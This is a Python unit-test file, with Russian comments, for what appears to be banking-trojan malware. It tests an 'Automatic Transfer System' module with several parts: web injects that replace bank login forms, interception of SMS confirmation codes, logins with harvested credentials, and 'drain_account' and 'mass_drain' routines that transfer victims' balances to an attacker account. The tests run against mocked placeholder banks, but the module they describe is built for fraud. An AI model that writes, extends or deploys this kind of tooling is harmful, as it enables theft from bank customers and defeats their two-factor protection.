import unittest
import os
import sys
import json
import tempfile
from unittest.mock import MagicMock, patch
from datetime import datetime

# Добавляем путь к корневой директории проекта
ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.append(ROOT_DIR)

# Импортируем тестируемый модуль
from agent_modules.ats_module import (
    ATSConfig, WebInject, SMSInterceptor, BankSession, 
    AutomaticTransferSystem, create_ats
)

class TestATSConfig(unittest.TestCase):
    """Тесты для класса ATSConfig"""
    
    def test_init_default(self):
        """Тест инициализации конфигурации по умолчанию"""
        config = ATSConfig()
        self.assertIsNotNone(config.config)
        self.assertEqual(config.config["timeout"], 30)
        self.assertIsInstance(config.config["user_agents"], list)
        self.assertIsInstance(config.config["withdrawal_limits"], dict)
    
    def test_get_config_value(self):
        """Тест получения значения из конфигурации"""
        config = ATSConfig()
        self.assertEqual(config.get("timeout"), 30)
        self.assertEqual(config.get("nonexistent", "default"), "default")
    
    def test_load_config_file(self):
        """Тест загрузки конфигурации из файла"""
        # Создаем временный файл с конфигурацией
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            json.dump({"timeout": 60, "custom_key": "value"}, f)
            config_file = f.name
        
        try:
            config = ATSConfig(config_file)
            self.assertEqual(config.get("timeout"), 60)
            self.assertEqual(config.get("custom_key"), "value")
            # Должны сохраниться и значения по умолчанию
            self.assertIsInstance(config.get("user_agents"), list)
        finally:
            os.unlink(config_file)
    
    def test_save_config(self):
        """Тест сохранения конфигурации в файл"""
        config = ATSConfig()
        config.config["custom_key"] = "test_value"
        
        with tempfile.NamedTemporaryFile(suffix='.json', delete=False) as f:
            config_file = f.name
        
        try:
            result = config.save(config_file)
            self.assertTrue(result)
            
            # Проверяем, что файл создан и содержит нужные данные
            with open(config_file, 'r') as f:
                loaded_config = json.load(f)
                self.assertEqual(loaded_config["custom_key"], "test_value")
                self.assertEqual(loaded_config["timeout"], 30)
        finally:
            os.unlink(config_file)

class TestSMSInterceptor(unittest.TestCase):
    """Тесты для класса SMSInterceptor"""
    
    def setUp(self):
        """Настройка для тестов"""
        self.config = ATSConfig()
        self.interceptor = SMSInterceptor(self.config)
    
    def test_register_target(self):
        """Тест регистрации номера для перехвата"""
        result = self.interceptor.register_target("+79991234567", "sberbank")
        self.assertTrue(result)
        self.assertIn("+79991234567", self.interceptor.intercepted_codes)
        self.assertEqual(self.interceptor.intercepted_codes["+79991234567"]["bank_type"], "sberbank")
    
    def test_add_intercepted_code(self):
        """Тест добавления перехваченного кода"""
        phone = "+79991234567"
        code = "123456"
        
        self.interceptor.add_intercepted_code(phone, code)
        
        self.assertIn(phone, self.interceptor.intercepted_codes)
        codes = self.interceptor.intercepted_codes[phone]["codes"]
        self.assertEqual(len(codes), 1)
        self.assertEqual(codes[0]["code"], code)
        self.assertFalse(codes[0]["used"])
    
    def test_get_latest_code(self):
        """Тест получения последнего перехваченного кода"""
        phone = "+79991234567"
        
        # Добавляем два кода
        self.interceptor.add_intercepted_code(phone, "111111")
        self.interceptor.add_intercepted_code(phone, "222222")
        
        # Получаем последний код
        code = self.interceptor.get_latest_code(phone)
        self.assertEqual(code, "222222")
        
        # Проверяем, что код помечен как использованный
        codes = self.interceptor.intercepted_codes[phone]["codes"]
        for c in codes:
            if c["code"] == "222222":
                self.assertTrue(c["used"])
            else:
                self.assertFalse(c["used"])
        
        # Второй раз получаем - должен вернуться первый код
        code = self.interceptor.get_latest_code(phone)
        self.assertEqual(code, "111111")
        
        # Все коды использованы - должен вернуться None
        code = self.interceptor.get_latest_code(phone)
        self.assertIsNone(code)
    
    def test_get_latest_code_max_age(self):
        """Тест получения кода с ограничением по возрасту"""
        phone = "+79991234567"
        
        # Добавляем код с устаревшей отметкой времени
        self.interceptor.add_intercepted_code(phone, "old_code", datetime.now().timestamp() - 600)
        
        # Добавляем свежий код
        self.interceptor.add_intercepted_code(phone, "new_code")
        
        # Получаем код с ограничением 5 минут
        code = self.interceptor.get_latest_code(phone, max_age_seconds=300)
        self.assertEqual(code, "new_code")
        
        # Старый код не должен возвращаться при ограничении
        code = self.interceptor.get_latest_code(phone, max_age_seconds=300)
        self.assertIsNone(code)

class TestWebInject(unittest.TestCase):
    """Тесты для класса WebInject"""
    
    def setUp(self):
        """Настройка для тестов"""
        self.config = ATSConfig()
        
        # Добавляем тестовые инъекции в конфигурацию
        self.config.config["webinjects"] = {
            "test_bank": {
                "injects": [
                    {
                        "url_pattern": "login\\.testbank\\.com",
                        "scripts": [
                            {"content": "console.log('Injected script');"}
                        ],
                        "styles": ["body { background: red; }"],
                        "elements": [
                            {"selector": "#login-form", "html": "<div>Fake login form</div>"}
                        ]
                    }
                ]
            }
        }
        
        self.webinject = WebInject("test_bank", self.config)
    
    def test_get_inject_for_url(self):
        """Тест получения инъекции для URL"""
        # URL, соответствующий шаблону
        inject = self.webinject.get_inject_for_url("https://login.testbank.com/auth")
        self.assertIsNotNone(inject)
        self.assertIn("scripts", inject)
        
        # URL, не соответствующий шаблону
        inject = self.webinject.get_inject_for_url("https://example.com")
        self.assertIsNone(inject)
    
    @patch('agent_modules.ats_module.BeautifulSoup')
    def test_modify_html(self, mock_bs):
        """Тест модификации HTML"""
        # Настраиваем имитацию BeautifulSoup
        mock_soup = MagicMock()
        mock_bs.return_value = mock_soup
        
        # Создаем фиктивные теги для добавления
        mock_head = MagicMock()
        mock_soup.head = mock_head
        
        # Настраиваем select_one для поиска элементов
        mock_target = MagicMock()
        mock_soup.select_one.return_value = mock_target
        
        # Инъекция для тестирования
        inject_data = {
            "scripts": [{"content": "test script"}, {"src": "test.js"}],
            "styles": ["test style"],
            "elements": [{"selector": "#login", "html": "<div>test</div>"}]
        }
        
        # Создаем экземпляр mock для второго вызова BeautifulSoup
        mock_element_soup = MagicMock()
        # Настраиваем side_effect для возврата разных значений при разных вызовах
        mock_bs.side_effect = [mock_soup, mock_element_soup]
        
        # Вызываем тестируемый метод
        self.webinject.modify_html("<html><head></head><body></body></html>", inject_data)
        
        # Проверяем, что созданы и добавлены соответствующие элементы
        self.assertEqual(mock_bs.call_count, 2)  # Вызван дважды - для документа и для элемента
        self.assertEqual(mock_soup.new_tag.call_count, 3)  # 2 скрипта + 1 стиль
        self.assertEqual(mock_head.append.call_count, 3)  # добавлены в head
        mock_soup.select_one.assert_called_once_with("#login")
        mock_target.replace_with.assert_called_once()

@patch('agent_modules.ats_module.REQUESTS_AVAILABLE', True)
@patch('agent_modules.ats_module.requests')
class TestBankSession(unittest.TestCase):
    """Тесты для класса BankSession"""
    
    def setUp(self):
        """Настройка для тестов"""
        self.config = ATSConfig()
        
        # Добавляем параметры тестового банка
        self.config.config["banks"] = {
            "test_bank": {
                "login_url": "https://test.bank/login",
                "login_action": "https://test.bank/auth",
                "login_form": {
                    "username": "$username",
                    "password": "$password",
                    "token": "static_token"
                },
                "login_success_pattern": "Welcome",
                "account_url": "https://test.bank/account",
                "balance_pattern": "Balance: ([0-9,.]+)",
                "transfer_url": "https://test.bank/transfer",
                "transfer_form": {
                    "to": "$TARGET_ACCOUNT",
                    "amount": "$AMOUNT",
                    "description": "$DESCRIPTION",
                    "token": "static_token"
                },
                "transfer_action": "https://test.bank/perform_transfer",
                "transfer_success_pattern": "Success",
                "confirmation_pattern": "Enter code",
                "confirmation_url": "https://test.bank/confirm",
                "confirmation_form": {
                    "code": "$CODE",
                    "token": "static_token"
                },
                "confirmation_success_pattern": "Confirmed"
            }
        }
    
    def test_init(self, mock_requests):
        """Тест инициализации сессии банка"""
        mock_session = MagicMock()
        mock_requests.Session.return_value = mock_session
        
        session = BankSession("test_bank", self.config)
        
        # Проверяем, что сессия создана и настроена
        self.assertEqual(session.bank_type, "test_bank")
        self.assertEqual(session.session, mock_session)
        self.assertFalse(session.authenticated)
        self.assertEqual(session.balance, 0.0)
        
        # Проверяем, что заголовки установлены
        mock_session.headers.update.assert_called_once()
    
    def test_login_success(self, mock_requests):
        """Тест успешного входа"""
        # Настраиваем имитацию requests и ответов
        mock_session = MagicMock()
        mock_requests.Session.return_value = mock_session
        
        # Имитируем ответы сервера
        login_response = MagicMock()
        login_response.text = "Welcome, user!"
        
        account_response = MagicMock()
        account_response.text = "Balance: 1000.50"
        
        mock_session.get.side_effect = [login_response, account_response]
        mock_session.post.return_value = login_response
        
        # Создаем сессию и выполняем вход
        session = BankSession("test_bank", self.config)
        result = session.login({"username": "testuser", "password": "testpass"})
        
        # Проверяем результат
        self.assertTrue(result)
        self.assertTrue(session.authenticated)
        self.assertEqual(session.balance, 1000.50)
        
        # Проверяем вызовы запросов
        mock_session.get.assert_any_call("https://test.bank/login", timeout=30)
        mock_session.get.assert_any_call("https://test.bank/account", timeout=30)
        mock_session.post.assert_called_once_with(
            "https://test.bank/auth",
            data={"username": "testuser", "password": "testpass", "token": "static_token"},
            timeout=30
        )
    
    def test_login_failure(self, mock_requests):
        """Тест неудачного входа"""
        # Настраиваем имитацию requests и ответов
        mock_session = MagicMock()
        mock_requests.Session.return_value = mock_session
        
        # Имитируем ответ сервера без строки успеха
        login_response = MagicMock()
        login_response.text = "Invalid credentials"
        
        mock_session.get.return_value = login_response
        mock_session.post.return_value = login_response
        
        # Создаем сессию и выполняем вход
        session = BankSession("test_bank", self.config)
        result = session.login({"username": "testuser", "password": "wrong"})
        
        # Проверяем результат
        self.assertFalse(result)
        self.assertFalse(session.authenticated)
        self.assertEqual(session.balance, 0.0)
    
    def test_transfer_success(self, mock_requests):
        """Тест успешного перевода"""
        # Настраиваем имитацию requests и ответов
        mock_session = MagicMock()
        mock_requests.Session.return_value = mock_session
        
        # Имитируем ответы сервера
        transfer_form_response = MagicMock()
        transfer_form_response.text = "Transfer form"
        
        transfer_result_response = MagicMock()
        transfer_result_response.text = "Success! Transfer completed."
        
        account_response = MagicMock()
        account_response.text = "Balance: 500.25"
        
        mock_session.get.side_effect = [transfer_form_response, account_response]
        mock_session.post.return_value = transfer_result_response
        
        # Создаем сессию и настраиваем
        session = BankSession("test_bank", self.config)
        session.authenticated = True
        session.balance = 1000.50
        
        # Выполняем перевод
        result = session.transfer("acc123456", 500.25, "Test transfer")
        
        # Проверяем результат
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["amount"], 500.25)
        self.assertEqual(result["target"], "acc123456")
        self.assertEqual(session.balance, 500.25)
        
        # Проверяем вызовы запросов
        mock_session.get.assert_any_call("https://test.bank/transfer", timeout=30)
        mock_session.post.assert_called_once_with(
            "https://test.bank/perform_transfer",
            data={
                "to": "acc123456",
                "amount": "500.25",
                "description": "Test transfer",
                "token": "static_token"
            },
            timeout=30
        )
    
    def test_transfer_confirmation_required(self, mock_requests):
        """Тест перевода с требованием подтверждения"""
        # Настраиваем имитацию requests и ответов
        mock_session = MagicMock()
        mock_requests.Session.return_value = mock_session
        mock_session.cookies = MagicMock()
        mock_session.cookies.get.return_value = "session123"
        
        # Имитируем ответы сервера
        transfer_form_response = MagicMock()
        transfer_form_response.text = "Transfer form"
        
        transfer_result_response = MagicMock()
        transfer_result_response.text = "Enter code: Please enter the confirmation code"
        
        mock_session.get.return_value = transfer_form_response
        mock_session.post.return_value = transfer_result_response
        
        # Создаем сессию и настраиваем
        session = BankSession("test_bank", self.config)
        session.authenticated = True
        session.balance = 1000.50
        
        # Выполняем перевод
        result = session.transfer("acc123456", 500.25)
        
        # Проверяем результат
        self.assertEqual(result["status"], "confirmation_required")
        self.assertEqual(result["message"], "Требуется подтверждение")
        self.assertEqual(result["confirmation_url"], "https://test.bank/confirm")
        self.assertEqual(result["session_id"], "session123")
    
    def test_confirm_transfer_success(self, mock_requests):
        """Тест успешного подтверждения перевода"""
        # Настраиваем имитацию requests и ответов
        mock_session = MagicMock()
        mock_requests.Session.return_value = mock_session
        
        # Имитируем ответы сервера
        confirm_response = MagicMock()
        confirm_response.text = "Confirmed! Transfer completed."
        
        account_response = MagicMock()
        account_response.text = "Balance: 500.25"
        
        mock_session.post.return_value = confirm_response
        mock_session.get.return_value = account_response
        
        # Создаем сессию и настраиваем
        session = BankSession("test_bank", self.config)
        session.authenticated = True
        session.balance = 1000.50
        
        # Подтверждаем перевод
        result = session.confirm_transfer({"CODE": "123456"})
        
        # Проверяем результат
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["message"], "Перевод подтвержден")
        self.assertEqual(session.balance, 500.25)
        
        # Проверяем вызовы запросов
        mock_session.post.assert_called_once_with(
            "https://test.bank/confirm",
            data={"code": "123456", "token": "static_token"},
            timeout=30
        )

@patch('agent_modules.ats_module.REQUESTS_AVAILABLE', True)
class TestAutomaticTransferSystem(unittest.TestCase):
    """Тесты для класса AutomaticTransferSystem"""
    
    def setUp(self):
        """Настройка для тестов"""
        # Создаем временную конфигурацию
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            json.dump({
                "withdrawal_limits": {
                    "transaction": 1000,
                    "daily": 3000
                },
                "banks": {
                    "test_bank": {
                        "login_url": "https://test.bank/login"
                    }
                }
            }, f)
            self.config_file = f.name
        
        # Создаем систему ATS
        self.ats = create_ats(self.config_file)
    
    def tearDown(self):
        """Очистка после тестов"""
        if hasattr(self, 'config_file') and os.path.exists(self.config_file):
            os.unlink(self.config_file)
    
    @patch('agent_modules.ats_module.BankSession')
    def test_login_to_bank_success(self, mock_bank_session):
        """Тест успешного входа в банк"""
        # Настраиваем имитацию BankSession
        mock_session = MagicMock()
        mock_session.login.return_value = True
        mock_bank_session.return_value = mock_session
        
        # Выполняем вход
        result = self.ats.login_to_bank("test_bank", {
            "username": "testuser",
            "password": "password",
            "phone": "+79991234567"
        })
        
        # Проверяем результат
        self.assertTrue(result)
        self.assertEqual(len(self.ats.active_sessions), 1)
        
        # Проверяем, что номер телефона зарегистрирован для перехвата
        self.assertIn("+79991234567", self.ats.sms_interceptor.intercepted_codes)
    
    @patch('agent_modules.ats_module.BankSession')
    def test_login_to_bank_failure(self, mock_bank_session):
        """Тест неудачного входа в банк"""
        # Настраиваем имитацию BankSession
        mock_session = MagicMock()
        mock_session.login.return_value = False
        mock_bank_session.return_value = mock_session
        
        # Выполняем вход
        result = self.ats.login_to_bank("test_bank", {
            "username": "testuser",
            "password": "wrong"
        })
        
        # Проверяем результат
        self.assertFalse(result)
        self.assertEqual(len(self.ats.active_sessions), 0)
    
    def test_drain_account_session_not_found(self):
        """Тест дрейна с несуществующей сессией"""
        result = self.ats.drain_account("nonexistent_session", "acc123456")
        self.assertEqual(result["status"], "error")
        self.assertEqual(result["message"], "Сессия не найдена")
    
    @patch('agent_modules.ats_module.BankSession')
    def test_drain_account_success(self, mock_bank_session):
        """Тест успешного дрейна средств"""
        # Настраиваем имитацию BankSession
        mock_session = MagicMock()
        mock_session.balance = 1500.0
        mock_session.transfer.return_value = {
            "status": "success",
            "message": "Перевод выполнен",
            "amount": 1000.0,
            "target": "acc123456",
            "balance": 500.0
        }
        
        # Добавляем сессию в активные
        session_id = "test_bank_user_1234"
        self.ats.active_sessions[session_id] = mock_session
        
        # Выполняем дрейн
        result = self.ats.drain_account(session_id, "acc123456", 1000.0)
        
        # Проверяем результат
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["amount"], 1000.0)
        
        # Проверяем, что результат сохранен
        self.assertEqual(len(self.ats.results), 1)
        self.assertEqual(self.ats.results[0]["operation"], "drain")
        self.assertEqual(self.ats.results[0]["amount"], 1000.0)
    
    @patch('agent_modules.ats_module.BankSession')
    def test_drain_account_confirmation_required(self, mock_bank_session):
        """Тест дрейна с требованием подтверждения"""
        # Настраиваем имитацию BankSession
        mock_session = MagicMock()
        mock_session.balance = 1500.0
        mock_session.transfer.return_value = {
            "status": "confirmation_required",
            "message": "Требуется подтверждение",
            "confirmation_url": "https://test.bank/confirm"
        }
        
        # Добавляем сессию в активные
        session_id = "test_bank_user_1234"
        self.ats.active_sessions[session_id] = mock_session
        
        # Выполняем дрейн
        result = self.ats.drain_account(session_id, "acc123456", 1000.0)
        
        # Проверяем результат
        self.assertEqual(result["status"], "confirmation_required")
        self.assertEqual(result["session_id"], session_id)
        self.assertEqual(result["target_account"], "acc123456")
        self.assertEqual(result["amount"], 1000.0)
    
    @patch('agent_modules.ats_module.BankSession')
    def test_confirm_transfer_with_sms(self, mock_bank_session):
        """Тест подтверждения перевода с помощью SMS"""
        # Настраиваем имитацию BankSession
        mock_session = MagicMock()
        mock_session.confirm_transfer.return_value = {
            "status": "success",
            "message": "Перевод подтвержден",
            "balance": 500.0
        }
        
        # Добавляем сессию в активные
        session_id = "test_bank_user_1234"
        self.ats.active_sessions[session_id] = mock_session
        
        # Добавляем перехваченный код
        phone = "+79991234567"
        self.ats.sms_interceptor.add_intercepted_code(phone, "123456")
        
        # Подтверждаем перевод
        result = self.ats.confirm_transfer_with_sms(session_id, phone)
        
        # Проверяем результат
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["message"], "Перевод подтвержден")
        
        # Проверяем вызов метода подтверждения с правильным кодом
        mock_session.confirm_transfer.assert_called_once_with({"CODE": "123456"})
        
        # Проверяем, что результат сохранен
        self.assertEqual(len(self.ats.results), 1)
        self.assertEqual(self.ats.results[0]["operation"], "confirm")
        self.assertEqual(self.ats.results[0]["code"], "123456")
    
    @patch('agent_modules.ats_module.BankSession')
    @patch.object(AutomaticTransferSystem, 'login_to_bank')
    @patch.object(AutomaticTransferSystem, 'drain_account')
    def test_mass_drain(self, mock_drain, mock_login, mock_bank_session):
        """Тест массового дрейна средств"""
        # Настраиваем имитации методов
        mock_login.side_effect = [True, False, True]  # Первый и третий входы успешны
        
        mock_drain.side_effect = [
            {
                "status": "success",
                "amount": 1000.0,
                "target": "acc123456"
            },
            {
                "status": "confirmation_required",
                "amount": 500.0,
                "target": "acc123456"
            }
        ]
        
        # Настраиваем имитацию сессий
        mock_session1 = MagicMock()
        mock_session1.bank_type = "bank1"
        mock_session1.authenticated = True
        
        mock_session2 = MagicMock()
        mock_session2.bank_type = "bank3"
        mock_session2.authenticated = True
        
        # Добавляем сессии в активные сессии
        self.ats.active_sessions = {
            "bank1_user1_1234": mock_session1,
            "bank3_user3_1234": mock_session2
        }
        
        # Выполняем массовый дрейн
        credentials_list = [
            {"bank_type": "bank1", "username": "user1", "password": "pass1"},
            {"bank_type": "bank2", "username": "user2", "password": "pass2"},
            {"bank_type": "bank3", "username": "user3", "password": "pass3"}
        ]
        
        result = self.ats.mass_drain(credentials_list, "acc123456")
        
        # Проверяем результат
        self.assertEqual(result["total_attempts"], 3)
        self.assertEqual(result["successful"], 1)
        self.assertEqual(result["failed"], 1)
        self.assertEqual(result["pending"], 1)
        self.assertEqual(result["total_amount"], 1000.0)
        self.assertEqual(len(result["details"]), 3)
    
    def test_cleanup(self):
        """Тест очистки сессий и результатов"""
        # Добавляем тестовые данные
        self.ats.active_sessions = {"session1": MagicMock(), "session2": MagicMock()}
        self.ats.results = [{"test": "result1"}, {"test": "result2"}]
        
        # Выполняем очистку
        self.ats.cleanup()
        
        # Проверяем результат
        self.assertEqual(len(self.ats.active_sessions), 0)
        self.assertEqual(len(self.ats.results), 0)


if __name__ == '__main__':
    unittest.main() 